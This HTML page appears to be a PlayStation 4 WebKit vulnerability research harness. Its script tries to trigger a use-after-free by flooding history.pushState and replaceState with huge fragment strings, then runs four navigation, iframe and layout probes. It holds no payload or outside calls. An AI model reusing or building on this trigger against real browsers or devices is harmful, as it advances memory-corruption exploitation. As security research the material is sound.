<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – UAF Navigation Experiments (A–D)</title>
<style>
  body { font-family: monospace; background:#000; color:#0f0; }
  pre { white-space: pre-wrap; }
  button { margin: 6px; }
</style>
</head>
<body>

<h2>PS4 WebKit – UAF Navigation Experiments</h2>
<button onclick="runAll()">RUN ALL (Exp 1–4)</button>
<pre id="log"></pre>

<script>
const logEl = document.getElementById('log');
const sleep = ms => new Promise(r => setTimeout(r, ms));
function log(s){ logEl.textContent += s + "\n"; }

// ----------------------------
// UAF TRIGGER (CONFIRMADO)
// ----------------------------
async function triggerUAF(){
  log("=== UAF TRIGGER START ===");
  let size = 977;
  const STEP = 14461;

  for(let i=0;i<48;i++){
    let frag = "A".repeat(size);
    history.pushState({}, "", "#"+frag);
    history.replaceState({}, "", "#"+frag.slice(0, frag.length >> 1));
    if(i % 6 === 0)
      setTimeout(()=>history.back(),0);
    size += STEP;
    await sleep(5);
  }

  log(">>> UAF WINDOW <<<");
  await sleep(120);
}

// ----------------------------
// EXPERIMENT 1
// Reentrada de navegação
// ----------------------------
async function exp1(){
  log("\n=== EXP 1: Re-entrant Navigation ===");
  const before = document.URL.length;
  log("[E1] URL.length before = " + before);

  location.hash = "#E1";
  await sleep(20);
  history.replaceState({e:1}, "", "#E1R");

  const after = document.URL.length;
  log("[E1] URL.length after  = " + after);
}

// ----------------------------
// EXPERIMENT 2
// Frame resurrection
// ----------------------------
async function exp2(){
  log("\n=== EXP 2: Frame Resurrection ===");
  let f = document.createElement("iframe");
  document.body.appendChild(f);
  await sleep(10);
  document.body.removeChild(f);
  await sleep(10);

  f = document.createElement("iframe");
  document.body.appendChild(f);
  log("[E2] iframe recreated");
}

// ----------------------------
// EXPERIMENT 3
// Same-document concurrent navigation
// ----------------------------
async function exp3(){
  log("\n=== EXP 3: Concurrent Fragment/State ===");
  const before = document.URL.length;
  log("[E3] URL.length before = " + before);

  location.hash = "#E3_" + "B".repeat(64);
  history.replaceState({x:3}, "", "#E3S");

  const after = document.URL.length;
  log("[E3] URL.length after  = " + after);
}

// ----------------------------
// EXPERIMENT 4
// Touch document/layout
// ----------------------------
async function exp4(){
  log("\n=== EXP 4: Layout Touch ===");
  const w = document.documentElement.clientWidth;
  const h = document.documentElement.clientHeight;
  log("[E4] layout read w=" + w + " h=" + h);

  // touch navigation-adjacent properties
  log("[E4] readyState = " + document.readyState);
  log("[E4] history.length = " + history.length);
}

// ----------------------------
// RUN ALL
// ----------------------------
async function runAll(){
  logEl.textContent = "";
  log("=== TEST START ===");

  await triggerUAF();

  // Ordem é deliberada:
  // 1) navegação
  // 2) frame
  // 3) concorrência
  // 4) layout
  await exp1();
  await sleep(40);

  await exp2();
  await sleep(40);

  await exp3();
  await sleep(40);

  await exp4();

  log("\n=== TEST END ===");
}
</script>

</body>
</html>
